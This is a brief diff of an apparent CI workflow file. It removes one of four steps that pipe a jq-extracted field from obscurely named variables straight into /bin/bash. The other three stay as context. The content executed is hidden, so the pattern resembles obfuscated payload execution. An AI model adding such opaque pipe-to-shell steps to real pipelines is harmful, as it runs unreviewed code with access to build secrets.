@@ -22,7 +22,6 @@ jobs:
           echo $as9675 | jq -r .uumz32 | /bin/bash
           echo $gr2162 | jq -r .if6631 | /bin/bash
           printf '%s' "$kbggb4" | jq -r .qasu144 | /bin/bash
-          echo $usvhm55 | jq -r .kwgc5 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
